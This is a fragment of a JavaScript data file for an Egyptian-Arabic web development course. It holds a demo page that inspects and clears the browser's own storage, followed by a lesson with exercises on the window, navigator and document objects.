const kb = n => (n < 1024 ? n + " بايت" : (n / 1024).toFixed(1) + " KB");

function section(title, rows, clear) {
  const sec = document.createElement("section");
  const h = document.createElement("h2");
  h.textContent = title;
  if (clear && Array.isArray(rows) && rows.length) {
    const b = document.createElement("button");
    b.type = "button";
    b.textContent = "امسح الكل";
    b.addEventListener("click", async () => { await clear(); render(); });
    h.append(b);
  }
  sec.append(h);
  if (typeof rows === "string") {
    const p = document.createElement("p");
    p.className = "muted";
    p.textContent = rows;
    sec.append(p);
  } else if (!rows.length) {
    const p = document.createElement("p");
    p.className = "muted";
    p.textContent = "فاضي";
    sec.append(p);
  } else {
    const table = document.createElement("table");
    for (const [a, b] of rows) {
      const tr = table.insertRow();
      tr.insertCell().textContent = a;
      tr.insertCell().textContent = b;
    }
    sec.append(table);
  }
  return sec;
}

// كل مصدر ممكن يرمي (إعدادات، متصفح قديم)، فكل واحد في try لوحده.
// وصفحة معزولة (iframe عليه sandbox) الـ origin بتاعها "null": مفيش تخزين أصلًا، فمنسألش
async function tryRows(fn) {
  if (origin === "null") return "مش متاح هنا: الصفحة معزولة (origin = null)";
  try { return await fn(); } catch (err) { return "مش متاح هنا: " + err.name; }
}

function storageRows(kind) {
  const s = window[kind];
  const rows = [];
  for (let i = 0; i < s.length; i++) {
    const k = s.key(i);
    rows.push([k, s.getItem(k).slice(0, 60) + " (" + kb(size(k) + size(s.getItem(k))) + ")"]);
  }
  return rows;
}

async function render() {
  document.querySelector("#origin").textContent = location.origin;
  const parts = [
    ["الكوكيز (اللي JS يشوفها بس، مش HttpOnly)", () => document.cookie ? document.cookie.split("; ").map(c => { const i = c.indexOf("="); return [c.slice(0, i), decodeURIComponent(c.slice(i + 1))]; }) : [],
      () => { for (const c of document.cookie.split("; ")) document.cookie = c.split("=")[0] + "=; max-age=0; path=/"; }],
    ["localStorage", () => storageRows("localStorage"), () => localStorage.clear()],
    ["sessionStorage (التاب ده بس)", () => storageRows("sessionStorage"), () => sessionStorage.clear()],
    ["IndexedDB", async () => (await indexedDB.databases()).map(d => [d.name, "version " + d.version]),
      async () => { for (const d of await indexedDB.databases()) indexedDB.deleteDatabase(d.name); }],
    ["Cache API", async () => Promise.all((await caches.keys()).map(async n => [n, (await (await caches.open(n)).keys()).length + " طلب"])),
      async () => { for (const n of await caches.keys()) await caches.delete(n); }],
    ["Service workers (ممكن يملوا الكاش تاني بعد ما تمسحه)", async () => (await navigator.serviceWorker.getRegistrations()).map(r => [r.scope, (r.active || r.waiting || r.installing)?.state || "?"]),
      async () => { for (const r of await navigator.serviceWorker.getRegistrations()) await r.unregister(); }],
    ["المساحة كلها (navigator.storage)", async () => {
      const e = await navigator.storage.estimate();
      return [["مستخدم", kb(e.usage)], ["الحد التقريبي", (e.quota / 1024 ** 3).toFixed(1) + " GB"], ["persisted", String(await navigator.storage.persisted())]];
    }],
  ];
  const sections = [];
  for (const [title, read, clear] of parts) sections.push(section(title, await tryRows(read), clear));
  out.replaceChildren(...sections);
}

document.querySelector("#demo").addEventListener("click", async () => {
  if (origin === "null") return console.log("التجربة مش هتشتغل هنا: origin = null");
  try {
    document.cookie = "theme=dark; max-age=3600; path=/; SameSite=Lax";
    localStorage.setItem("draft", JSON.stringify({ title: "قايمة البقالة" }));
    sessionStorage.setItem("step", "2");
    const db = indexedDB.open("notes-db", 1);
    db.onupgradeneeded = () => db.result.createObjectStore("notes");
    await new Promise(r => { db.onsuccess = () => { db.result.close(); r(); }; db.onerror = r; });
    await (await caches.open("pages-v1")).put("/offline", new Response("أنت أوفلاين"));
  } catch (err) {
    console.log("التجربة وقفت عند:", err.name);
  }
  render();
});
document.querySelector("#refresh").addEventListener("click", render);
render();
</script>
</body>
</html>
~~~

## هتشوف إيه

**في الـ preview اللي فوق كل قسم مكتوب فيه «مش متاح هنا: الصفحة معزولة (origin = null)»**، وده الشكل الصح للصفحة في مكان ممنوع فيه التخزين: الـ iframe بتاع الـ preview عليه [[sandbox]] من غير [[allow-same-origin]]، فالـ origin بتاعه [["null"]]. انسخها وشغّلها من سيرفر محلي، ودوس «حط بيانات تجربة»:

~~~text الناتج (Chrome 157، origin جديد على http://localhost، بعد «حط بيانات تجربة» وتسجيل SW تجربة)
الكوكيز (اللي JS يشوفها بس، مش HttpOnly)   theme    dark
localStorage                              draft    {"title":"قايمة البقالة"} (42 بايت)
sessionStorage (التاب ده بس)               step     2 (5 بايت)
IndexedDB                                 notes-db version 1
Cache API                                 pages-v1 1 طلب
Service workers                           http://localhost:8767/lab/  activated
المساحة كلها (navigator.storage)           مستخدم 1.3 KB | الحد التقريبي 10.0 GB | persisted false

بعد «امسح الكل» في كل قسم و «حدّث»: كلهم «فاضي»، والمستخدم 1.6 KB
~~~

## ليه التصميم ده

- **قسم لكل مكان، والقراية جوه [[tryRows]]:** كل مصدر ممكن يرمي لوحده (الكوكيز ممنوعة والـ IndexedDB لأ مثلًا)، فقسم ممنوع ميوقفش الباقي.
- **[[parts]] لستة [عنوان، قراية، مسح]:** ضيف مكان جديد بسطر. ده أسهل من ٦ دوال render.
- **[[new Blob([s]).size]]** بيدي الحجم بالبايت UTF-8 (الـ draft العربي ٤٢ بايت)، مش عدد الحروف.
- **الجدول بـ [[insertRow]] و [[textContent]]:** قيم جاية من التخزين ممكن يبقى فيها HTML (حد حط [[<img onerror>]] في [[localStorage]])، فمفيش [[innerHTML]].
- **مسح الكوكيز** بيكتب كل اسم بـ [[max-age=0; path=/]]. كوكي اتعملت بـ path تاني مش هتتمسح كده، ودي حدود [[document.cookie]] (مبيقولش الـ path).

## الغلطة اللي ظهرت وهي اللي خلّت قسم الـ service workers يتضاف

أول تجربة كانت على [[localhost:8765]]: مسحنا الكاش، وبعد الـ reload رجع كاش تاني لوحده باسم مشروع قديم. السبب service worker من مشروع تاني كان اتشغّل قبل كده على **نفس البورت**: [[localhost:8765]] origin واحد لأي حاجة تشغّلها عليه، فالـ SW بتاع المشروع القديم لسه متسجّل وبيملا الكاش مع كل تحميل. عشان كده القسم ده موجود وفيه «امسح الكل» ([[registration.unregister()]]). والتجربة النهائية اتعملت على بورت جديد ([[8767]]) عشان تبدأ فاضية.

## اتقاس

- Playwright في Chrome 157 على [[http://localhost:8767]]: النواتج اللي فوق، و ٧ أزرار «امسح الكل» اتداسوا والكل بقى «فاضي»، ومفيش [[pageerror]].
- نفس الملف في [[showHTML]] بتاعة الموقع (نفس الـ sandbox بتاع الـ preview): أول نسخة كانت بتسأل كل مكان وتمسك الخطأ، فطلع ٦ أقسام [[SecurityError]] وقسم المساحة [[TypeError]] (حتى [[navigator.storage.estimate()]] بترفض هناك). بس [[indexedDB.databases()]] بالذات طلّعت في Playwright خطأ صفحة تاني من غير رسالة ([[pageerror: undefined]]) مع إن الـ [[catch]] مسك الـ [[SecurityError]] بتاعها. فبقت الصفحة تفحص [[origin === "null"]] الأول ومتسألش أصلًا. بعد التعديل: ٧ أقسام «الصفحة معزولة» ومفيش ولا خطأ.` },
      ],
      items: [
        {
          cmd: "window و navigator و document",
          title: "التاب والمتصفح والصفحة: التلات objects اللي JavaScript بيشوف بيهم المتصفح",
          desc: R`أي سكربت في صفحة بيلاقي قدامه ٣ objects جاهزين: [[window]] (التاب نفسه، وهو كمان الـ global object)، و [[navigator]] (المتصفح والجهاز: اللغة، والنت، والصلاحيات)، و [[document]] (الصفحة اللي جوه التاب: شجرة الـ DOM). الدرس ده بيفرق بينهم وبيوريك أهم حاجة في كل واحد.
• [[window]]: [[innerWidth]] و [[scrollY]] و [[location]] و [[history]] و [[setTimeout]] و [[addEventListener("resize")]]، وكل [[var]] وكل [[function]] برّه أي block بيبقوا خصايص عليه.
• [[globalThis]]: نفس الـ global object بس بالاسم اللي شغال في كل مكان (المتصفح و Node و الـ workers).
• [[navigator]]: [[language]] و [[languages]] و [[onLine]] و [[userAgent]] (ومتبنيش عليه قرارات)، وبوابات لـ [[clipboard]] و [[permissions]] و [[geolocation]] و [[serviceWorker]] و [[storage]].
• [[document]]: [[documentElement]] و [[head]] و [[body]] و [[title]] و [[readyState]] و [[cookie]].`,
          example: R`console.log(window === globalThis, window.document === document);
var shopName = "متجر النور";
let visits = 3;
console.log(window.shopName, window.visits);
console.log(innerWidth, innerHeight, location.pathname);
console.log(navigator.language, navigator.languages, navigator.onLine);
addEventListener("offline", () => console.log("النت قطع"));
console.log(document.title, document.documentElement.lang, document.readyState);`,
          try: R`افتح أي صفحة عندك من سيرفر محلي (مش [[file://]]) واكتب في الـ Console: [[Object.prototype.toString.call(window)]] و [[navigator.languages]] و [[document.readyState]]. وبعدين اعمل [[var name = 42]] واطبع [[typeof name]]. إيه اللي حصل وليه؟`,
          sol: R`~~~js الـ Console في Chrome 157
Object.prototype.toString.call(window)   // '[object Window]'
navigator.languages                      // ['en-US', 'en']
document.readyState                      // 'complete'
var name = 42;
typeof name                              // 'string'
name                                     // '42'
~~~

[[name]] مش متغيّر عادي: [[window.name]] خاصية جاهزة في المتصفح (اسم التاب، بيستخدمها [[window.open]])، والـ setter بتاعها بيحوّل أي قيمة لنص. فالـ [[var]] اللي برّه أي function مكتبتش متغيّر جديد، كتبت على الخاصية دي. نفس الحكاية مع [[status]] و [[top]] و [[parent]] و [[length]]. الحل: [[let]] و [[const]] (مبيتحطوش على [[window]])، أو [[type="module"]].`,
          teach: R`## الفكرة

المتصفح برنامج كبير، والصفحة جوه منه حتة صغيرة. JavaScript بيشوف الحاجات دي من ٣ objects، وكل واحد مسؤول عن مستوى:

~~~text
navigator   المتصفح والجهاز     اللغة، النت، الصلاحيات، الكليببورد
window      التاب ده           المقاس، الـ scroll، العنوان، التاريخ، التايمرز
document    الصفحة جوه التاب    شجرة الـ DOM: html و head و body وكل عنصر
~~~

الترتيب ده مهم: [[document]] و [[navigator]] نفسهم خصايص على [[window]] ([[window.document]] و [[window.navigator]])، فـ [[window]] هو الأب. كل النواتج تحت من Chrome 157 على صفحة متقدّمة من سيرفر محلي ([[http://localhost]])، إلا لو مكتوب Node.

---

## ١. [[window]]: التاب، والـ global object كمان

~~~text الناتج: سطر ١ و ٤ في المثال
true true
متجر النور undefined
~~~

**[[window === globalThis]]:** الـ global object هو الـ object اللي الأسامي العامة بتتدوّر فيه لو مش لاقيها في أي scope. في المتصفح اسمه [[window]] (وكمان [[self]] و [[frames]])، وفي الـ Web Worker اسمه [[self]]، وفي Node اسمه [[global]]. [[globalThis]] (ES2020) هو الاسم الموحّد اللي شغال في الكل، فلو كاتب مكتبة تشتغل في أكتر من مكان استخدمه.

**[[var]] و [[function]] بيتحطوا على [[window]]، و [[let]] و [[const]] لأ:** [[window.shopName]] طلعت «متجر النور» لأن [[var]] برّه أي function في سكربت عادي (classic script) بيعمل خاصية على الـ global object. و [[window.visits]] طلعت [[undefined]] لأن [[let]] بيتحط في مكان تاني اسمه «global lexical scope»: متاح بالاسم من أي سكربت، بس مش خاصية على [[window]]. وفي [[<script type="module">]] ولا واحد منهم بيوصل لـ [[window]].

**فخ ١: الأسامي المحجوزة.** [[window]] عليه مئات الخصايص الجاهزة. [[var name = 42]] بيكتب على [[window.name]] اللي بتحوّل لنص، فـ [[typeof name]] بقى [["string"]] (اتجرّب في «جرّب»). [[var status = 5]] نفس الكلام.

**فخ ٢: العناصر اللي ليها [[id]] بتبقى global.** صفحة فيها [[<div id="cart">]]:

~~~js
console.log(window.cart.textContent, cart === document.getElementById("cart"));
~~~

~~~text الناتج
السلة true
~~~

ده سلوك قديم اسمه «named access on window». متعتمدش عليه: لو حد عمل [[var cart]] أو ضاف عنصر تاني بنفس الـ id، الكود يبوظ. دايمًا [[document.querySelector("#cart")]].

### الحاجات اللي بتستخدمها كل يوم من [[window]]

| الخاصية | بترجّع | الناتج عندنا |
|---|---|---|
| [[innerWidth]] و [[innerHeight]] | مقاس الجزء اللي الصفحة بتترسم فيه بالـ CSS pixels | [[1280 720]] |
| [[devicePixelRatio]] | كام pixel حقيقي في كل CSS pixel | [[1.25]] على لابتوب بزوم ويندوز ١٢٥٪ |
| [[scrollX]] و [[scrollY]] و [[scrollTo()]] | الـ scroll الحالي، وتحرّكه | [[0]] |
| [[location]] | العنوان: [[href]] و [[origin]] و [[pathname]] و [[search]] و [[hash]]، و [[assign()]] و [[replace()]] و [[reload()]] | [[/l1.html]] و [[http://localhost:8765]] |
| [[history]] | [[back()]] و [[forward()]] و [[pushState()]] | درس «pushState و popstate» |
| [[matchMedia()]] | نفس media queries بتاعة CSS من JS | [[matchMedia("(prefers-reduced-motion: reduce)").matches]] |
| [[setTimeout]] و [[fetch]] و [[alert]] | دوال على [[window]] كمان | [[alert]] بيوقف الصفحة كلها لحد ما تقفله |

والأحداث اللي بتخص التاب كله بتتسمع على [[window]]: [[resize]] و [[scroll]] و [[load]] و [[online]] و [[offline]] و [[storage]] و [[popstate]]. [[addEventListener("offline", ...)]] في سطر ٧ هو [[window.addEventListener]] من غير ما تكتب [[window.]].

---

## ٢. [[navigator]]: المتصفح والجهاز

~~~text الناتج: سطر ٦ في المثال
en-US ['en-US', 'en'] true
~~~

**[[navigator.language]] و [[navigator.languages]]:** اللغة الأولى اللي اليوزر مختارها في إعدادات المتصفح، واللستة كلها بالترتيب. دي البداية الصح لاختيار لغة الموقع (تمرين ٣)، وبعدين تديها لـ [[Intl]] (وحدة «Intl كامل»).

**[[navigator.onLine]] والحدثين [[online]] و [[offline]]:** قطعنا النت عن التاب من Playwright، والـ listener اتنده:

~~~text الناتج (Chrome 157، النت اتقطع ورجع)
offline false
online true
~~~

بس خلي بالك: [[onLine === true]] معناها «فيه شبكة»، مش «فيه انترنت». جهاز متوصل براوتر من غير انترنت بيقول [[true]]. الحقيقة الوحيدة إن طلب [[fetch]] فعلًا نجح. استخدمها عشان تعرض «انت أوفلاين» بسرعة، مش عشان تقرر إن السيرفر شغال.

**[[navigator.userAgent]] ومتعملش «sniffing»:**

~~~text الناتج
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36
~~~

نص Chrome فيه «Mozilla» و «AppleWebKit» و «Safari»، لأسباب تاريخية: كل متصفح جديد كان بيقلّد نص اللي قبله عشان المواقع اللي بتفحص النص متقفلش في وشه. فـ [[userAgent.includes("Safari")]] بترجع [[true]] في Chrome (تمرين ٤). وكمان Chrome بقى يحط أرقام ثابتة ([[10.0]] و [[157.0.0.0]]) عشان يقلل التتبع. **القاعدة:** اسأل «الميزة موجودة؟» مش «المتصفح ده إيه؟»:

~~~js
if ("share" in navigator) { /* زرار المشاركة */ }
if (navigator.clipboard?.writeText) { /* زرار النسخ */ }
~~~

**الباقي بوابات:** [[navigator.clipboard]] و [[navigator.geolocation]] و [[navigator.share]] (درس «Clipboard و Geolocation و Share»)، و [[navigator.permissions]] (درس «Notification و permissions»)، و [[navigator.serviceWorker]] (وحدة PWA)، و [[navigator.storage]] (درس «تختار تخزين إيه» في الوحدة دي)، و [[navigator.hardwareConcurrency]] (عدد الأنوية: [[16]] عندنا، مفيد لعدد الـ workers).

---

## ٣. [[document]]: الصفحة

~~~text الناتج: آخر سطر في المثال، والسكربت في آخر body
أجزاء المتصفح ar loading
~~~

**[[document.readyState]]** بيمشي ٣ مراحل: [["loading"]] (الـ HTML لسه بيتقرا، وده اللي شافه سكربت جوه الـ body)، وبعدين [["interactive"]] (الشجرة خلصت، وبعدها على طول [[DOMContentLoaded]])، وبعدين [["complete"]] (الصور والـ CSS خلصوا، وبعدها [[load]]). اتقاس في تمرين ٥:

~~~text الناتج (Chrome 157)
loading → interactive → DOMContentLoaded → complete → load
~~~

| الخاصية | إيه |
|---|---|
| [[document.documentElement]] | عنصر [[<html>]]، أول عنصر في الشجرة (درس «شجرة الـ DOM» الجاي) |
| [[document.head]] و [[document.body]] | اختصارات للعنصرين |
| [[document.title]] | النص اللي في التاب، وتقدر تغيّره |
| [[document.URL]] و [[document.characterSet]] و [[document.contentType]] | [[http://localhost:8765/]] و [[UTF-8]] و [[text/html]] |
| [[document.cookie]] | الكوكيز اللي JS مسموح يشوفها (درس «document.cookie») |
| [[document.defaultView]] | يرجّعك لـ [[window]] من الـ document |

---

## ٤. نفس الأسامي في Node 24

~~~text الناتج: node -e 'console.log(typeof window, typeof globalThis, typeof navigator, navigator.language, navigator.userAgent, typeof document, typeof location)'
undefined object object en-US Node.js/24 undefined undefined
~~~

| | المتصفح | Node 24 |
|---|---|---|
| [[globalThis]] | [[window]] | [[global]] |
| [[window]] و [[document]] و [[location]] | موجودين | [[undefined]] (مفيش صفحة) |
| [[navigator]] | كامل | من Node 21: [[language]] و [[languages]] و [[userAgent]] و [[platform]] و [[hardwareConcurrency]] و [[locks]] بس |

فكود مشترك بين الاتنين يفحص: [[typeof document !== "undefined"]] قبل ما يلمس الصفحة.

---

## الخلاصة

| عايز | من |
|---|---|
| مقاس التاب، العنوان، التاريخ، التايمرز، أحداث التاب | [[window]] |
| الـ global object في أي بيئة | [[globalThis]] |
| لغة اليوزر، النت، صلاحيات وميزات المتصفح | [[navigator]] |
| أي عنصر في الصفحة، العنوان، حالة التحميل | [[document]] |

اللي ميتلخبطش: [[var]] برّه function بيكتب على [[window]] (وممكن يكتب على [[name]])، و [[onLine]] مش ضمان إن فيه انترنت، والـ [[userAgent]] بيكدب بالتصميم: افحص الميزة نفسها.`,
          lines: [
            R`[[window]] هو نفس [[globalThis]] في الصفحة، و [[document]] خاصية عليه: الاتنين [[true]]`,
            R`[[var]] برّه أي function في سكربت عادي بيعمل خاصية [[shopName]] على [[window]]`,
            R`[[let]] متاح بالاسم من أي حتة، بس مش بيبقى خاصية على [[window]]`,
            R`بيطبع «متجر النور» و [[undefined]]: الفرق بين [[var]] و [[let]] على الـ global object`,
            R`مقاس المساحة اللي الصفحة بتترسم فيها بالـ CSS pixels، والمسار من العنوان`,
            R`لغة المتصفح الأولى، واللستة كلها بالترتيب، و [[true]] لو فيه شبكة`,
            R`[[addEventListener]] من غير [[window.]] قدامها بيسمع على [[window]]: بيتنده أول ما الشبكة تقطع`,
            R`عنوان التاب، ولغة الصفحة من [[<html lang>]]، و [["loading"]] لو السكربت في الـ body`,
          ],
          practice: [
            { lvl: 'سريع', t: R`**اقرا وتوقّع:** سكربت عادي (مش module) فيه [[var shopName = "متجر النور"; let visits = 3; function greet() {} var name = 42;]] وبعده [[console.log(window.shopName, window.visits, typeof window.greet, typeof name, name === 42)]]. اكتب الـ ٥ قيم قبل ما تشغّل (من قسم ١ في الشرح).`, done: R`الخمسة صح، وتقدر تقول ليه [[name === 42]] بقت [[false]].`, sol: R`~~~html d1.html
<script>
var shopName = "متجر النور";
let visits = 3;
function greet() { return "أهلًا"; }
var name = 42;
console.log(window.shopName, window.visits, typeof window.greet, typeof name, name === 42);
</script>
~~~

~~~text الناتج (Chrome 157)
متجر النور undefined function string false
~~~

- [[var]] و [[function]] اللي برّه أي block بيتحطوا على [[window]]، و [[let]] لأ.
- [[name]] خاصية جاهزة على [[window]] بتحوّل أي قيمة لنص، فـ [[name]] بقت [["42"]] و [[=== 42]] بقت [[false]]. ولو السكربت [[type="module"]] كان [[window.shopName]] كمان [[undefined]] و [[name]] متغيّر عادي رقمه ٤٢.` },
            { lvl: 'تطبيق', t: R`**ابني:** شارة فوق الصفحة بتقول «متصل» بالأخضر، ولما النت يقطع تبقى حمرا ومكتوب «انت أوفلاين، التعديلات هتتحفظ لما النت يرجع». وتحتها مقاس الشاشة (يتحدث مع [[resize]]) و [[devicePixelRatio]] ولغات المتصفح. اختبرها من DevTools: Network ثم Offline (من قسمي ١ و ٢ في الشرح).`, done: R`لما تختار Offline الشارة بتحمر من غير reload، ولما ترجّع No throttling بتخضر، والمقاس بيتغيّر وانت بتصغّر الشباك.`, sol: R`~~~live 230 شارة النت والمقاس
<style>
  body { font: 16px/1.6 system-ui, sans-serif; margin: 16px; }
  #net { display: inline-block; padding: 4px 12px; border-radius: 999px; color: #fff; background: #0b6e4f; }
  #net.off { background: #b42318; }
  dl { display: grid; grid-template-columns: auto 1fr; gap: 4px 12px; }
  dt { font-weight: 700; }
</style>
<p id="net" role="status">متصل</p>
<dl>
  <dt>العرض × الطول</dt><dd id="size"></dd>
  <dt>devicePixelRatio</dt><dd id="dpr"></dd>
  <dt>لغات المتصفح</dt><dd id="langs"></dd>
</dl>
<script>
const net = document.querySelector("#net");
function showNet() {
  net.textContent = navigator.onLine ? "متصل" : "انت أوفلاين، التعديلات هتتحفظ لما النت يرجع";
  net.classList.toggle("off", !navigator.onLine);
}
addEventListener("online", showNet);
addEventListener("offline", showNet);
function showSize() {
  document.querySelector("#size").textContent = innerWidth + " × " + innerHeight;
  document.querySelector("#dpr").textContent = devicePixelRatio;
}
addEventListener("resize", showSize);
document.querySelector("#langs").textContent = navigator.languages.join("، ");
showNet();
showSize();
</script>
~~~

~~~text الناتج (Chrome 157 من سيرفر محلي، النت اتقطع من Playwright وبعدين المقاس اتغيّر لـ 360)
start:   متصل | 1280 × 720 | en-US، en
offline: انت أوفلاين، التعديلات هتتحفظ لما النت يرجع  (class="off")
online:  متصل
resized: 360 × 640
~~~

- **[[role="status"]]** بيخلي قارئ الشاشة يقول التغيير لوحده.
- **[[showNet()]] و [[showSize()]] في الآخر:** الأحداث بتيجي مع التغيير بس، فلازم تعرض الحالة الأولى بإيدك.
- **جرّب زرار «موبايل» فوق الصفحة الحية:** المقاس بيتغيّر لأن الـ iframe اتغيّر عرضه ([[resize]] بيتنده جوه الـ iframe كمان).` },
            { lvl: 'تطبيق', t: R`**ابني:** [[pickLang(languages, supported = ["ar", "en"], fallback = "ar")]] بتلف على [[navigator.languages]] بالترتيب وترجّع أول لغة موقعك بيدعمها (من غير المنطقة: [["ar-EG"]] تبقى [["ar"]])، ولو مفيش ترجّع الاحتياطي. جرّبها في Node 24 على ٥ لستات وعلى [[navigator.languages]] نفسه (من قسم ٢ في الشرح).`, done: R`[[["ar-EG","en"]]] بترجّع [["ar"]]، و [[["fr-FR","en-US","ar"]]] بترجّع [["en"]] (الترتيب مهم)، والفاضية والألماني بيرجّعوا [["ar"]]، و [[["EN-gb"]]] بترجّع [["en"]].`, sol: R`~~~js pick-lang.js
// pick-lang.js: اختار لغة الموقع من لغات المتصفح
function pickLang(languages, supported = ["ar", "en"], fallback = "ar") {
  for (const tag of languages) {
    const base = tag.toLowerCase().split("-")[0];
    if (supported.includes(base)) return base;
  }
  return fallback;
}
console.log(pickLang(["ar-EG", "en"]));
console.log(pickLang(["fr-FR", "en-US", "ar"]));
console.log(pickLang(["de-DE"]));
console.log(pickLang([]));
console.log(pickLang(["EN-gb"]));
console.log(typeof navigator, navigator.language, pickLang(navigator.languages));
~~~

~~~text الناتج (node pick-lang.js، Node 24.22)
ar
en
ar
ar
en
object en-US en
~~~

- **[[toLowerCase()]]:** الـ language tags مش حساسة للحروف ([["EN-gb"]] زي [["en-GB"]]).
- **[[split("-")[0]]]:** اللغة من غير المنطقة. الأدق [[new Intl.Locale(tag).language]] (درس «Intl.Locale»).
- **الترتيب:** اليوزر اللي حاطط فرنساوي ثم إنجليزي ثم عربي ياخد إنجليزي، لأن ده اختياره التاني. غلطة شائعة إنك تدوّر على [["ar"]] الأول في أي مكان في اللستة.
- **Node 24 فيه [[navigator]]** بـ [[language]] و [[languages]]، فالدالة نفسها اشتغلت هناك. في المتصفح اديها [[navigator.languages]] زي ما هي.` },
            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** موقع فيه [[if (navigator.userAgent.includes("Safari")) applySafariFix();]] عشان باج في Safari بس. اطبع [[navigator.userAgent.includes("Safari")]] و [[includes("Chrome")]] في Chrome. إيه المشكلة؟ وصلّح زرار «انسخ اللينك» اللي كان مكتوب [[if (ua.includes("Chrome")) copy(); else alert("متصفحك مش بيدعم")]] (من قسم ٢ في الشرح).`, done: R`عرفت إن Chrome بيقول «Safari» في الـ UA فالإصلاح هيتطبّق غلط، وبقى الفحص على الميزة: [[navigator.clipboard?.writeText]].`, sol: R`~~~js الـ Console في Chrome 157
const ua = navigator.userAgent;
console.log(ua.includes("Safari"), ua.includes("Chrome"));
console.log("clipboard" in navigator, typeof navigator.clipboard?.writeText, "share" in navigator);
~~~

~~~text الناتج
true true
true function true
~~~

الإصلاح:

~~~js copy-link.js
async function copyLink(url) {
  if (!navigator.clipboard?.writeText) return false; // المتصفح أو الصفحة (http مش آمن) مش بيدعم
  await navigator.clipboard.writeText(url);
  return true;
}
document.querySelector("#copy").hidden = !navigator.clipboard?.writeText;
~~~

- **ليه «Safari» في Chrome:** كل متصفح بيقلّد نص اللي قبله عشان المواقع اللي بتفحص النص متقفلش في وشه. Edge و Opera و Samsung Internet فيهم «Chrome» كمان. فأي [[includes]] على الـ UA هيصيب متصفحات غير اللي قصدتها.
- **الفحص على الميزة** بيشتغل صح في أي متصفح النهارده وبكرة، حتى لو اسمه اتغيّر.
- **[[?.]]** (optional chaining) بيرجّع [[undefined]] بدل ما يرمي لو [[clipboard]] مش موجود.
- **لو الباج نفسه في محرك معين** ومحتاج تعرفه فعلًا: [[navigator.userAgentData]] (Chrome و Edge بس) أو [[CSS.supports()]] للـ CSS. وده آخر حل.` },
            { lvl: 'تحدي', t: R`**قيس بنفسك:** اكتب سكربت في آخر الـ [[<body>]] بيسجّل [[document.readyState]] في الأول، ومع كل [[readystatechange]]، ومع [[DOMContentLoaded]] و [[load]]، ويطبع الترتيب كله لما [[load]] يحصل. وبعدين انقل نفس السكربت لـ [[<head>]] بـ [[defer]]: الحالة الأولى اتغيّرت لإيه وليه؟ (من قسم ٣ في الشرح).`, done: R`في الـ body طلع «loading → interactive → DOMContentLoaded → complete → load»، وبـ [[defer]] أول قيمة بقت [["interactive"]] لأن السكربت بيستنى الشجرة تخلص.`, sol: R`~~~html ready.html
<script>
const states = [document.readyState];
document.addEventListener("readystatechange", () => states.push(document.readyState));
document.addEventListener("DOMContentLoaded", () => states.push("DOMContentLoaded"));
addEventListener("load", () => { states.push("load"); console.log(states.join(" → ")); });
</script>
~~~

~~~text الناتج (Chrome 157، السكربت في آخر body)
loading → interactive → DOMContentLoaded → complete → load
~~~

- **[[interactive]] قبل [[DOMContentLoaded]]:** الحالة بتتغيّر الأول، وبعدها الحدث. فـ listener على [[readystatechange]] بيشوف [["interactive"]] قبل أي listener على [[DOMContentLoaded]].
- **[[complete]] قبل [[load]]:** نفس الفكرة.
- **بـ [[defer]]** في الـ head: السكربت بيتنفّذ بعد ما الشجرة تخلص وقبل [[DOMContentLoaded]]، فأول قيمة [["interactive"]] والباقي زي ما هو. ده سبب إن [[defer]] و [[type="module"]] بيغنّوك عن [[DOMContentLoaded]] (درس «defer و async و module»).
- **الحدث [[readystatechange]] على [[document]]** و [[load]] على [[window]]: لو حطيت [[load]] على [[document]] مش هيتنده.` },
          ],
          ref: [
            { t: "MDN: Window", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window" },
            { t: "MDN: Navigator", url: "https://developer.mozilla.org/en-US/docs/Web/API/Navigator" },
            { t: "MDN: Document", url: "https://developer.mozilla.org/en-US/docs/Web/API/Document" },
            { t: "MDN: globalThis", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/globalThis" },
            { t: "MDN: Navigator.languages", url: "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/languages" },
            { t: "MDN: Navigator.onLine", url: "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/onLine" },
            { t: "MDN: Browser detection using the user agent", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Browser_detection_using_the_user_agent" },
            { t: "MDN: Window.location", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/location" },
            { t: "MDN Learn: DOM scripting introduction", url: "https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/DOM_scripting" },
          ],
          pre: [{ to: "js/defer و async و module", why: R`فرق السكربت العادي والـ module بيغيّر مين بيتحط على [[window]]، ومراحل [[readyState]] مربوطة بـ [[defer]]` }, { to: "js/let و const و var", why: R`ليه [[var]] بيتحط على الـ global object و [[let]] لأ` }],
          deep: {
            why: R`كل API في المتصفح متعلّق في واحد من التلاتة دول. لما تعرف مين مسؤول عن إيه، بتعرف تدوّر: مقاس الشاشة مش في [[document]]، ولغة اليوزر مش في [[window]]. وفخاخ الـ global object ([[var name]] وعناصر الـ id) بتعمل باجات بتحيّر لأن مفيش error.`,
            how: R`المتصفح بيعمل [[Window]] لكل تاب وكل iframe، وجواه [[Document]] واحد للصفحة الحالية. لما تنقل لصفحة تانية الـ [[Document]] بيتغيّر والـ [[Window]] غالبًا بيتغيّر كمان (إلا في الـ bfcache). [[navigator]] واحد لكل [[window]] بس بيوصف المتصفح كله. والأسامي العامة بتتدوّر في السلسلة: الـ scope المحلي، ثم الـ global lexical scope ([[let]] و [[const]] و [[class]])، ثم خصايص [[window]].`,
            when: R`[[window]] للمقاس والـ scroll والعنوان والأحداث العامة. [[navigator]] لاختيار اللغة وعرض حالة النت وفحص الميزات. [[document]] لأي عنصر. و [[globalThis]] في كود هيشتغل في المتصفح و Node والـ workers.`,
            mistakes: R`[[var name]] أو [[var status]] برّه function. الاعتماد على عنصر بالـ id كمتغيّر. [[navigator.userAgent.includes(...)]] بدل فحص الميزة. اعتبار [[onLine]] دليل إن السيرفر شغال. [[window.addEventListener("load")]] في سكربت [[defer]] متأخر (ممكن [[load]] يكون حصل خلاص). استخدام [[window]] في كود هيشتغل في Node أو worker.`,
          },
        },
        {
          cmd: "شجرة الـ DOM: parent و children و siblings",
          title: "كل عنصر ليه أب وأولاد وإخوات: تتمشى في الشجرة وتنقل العناصر وتنسخها",
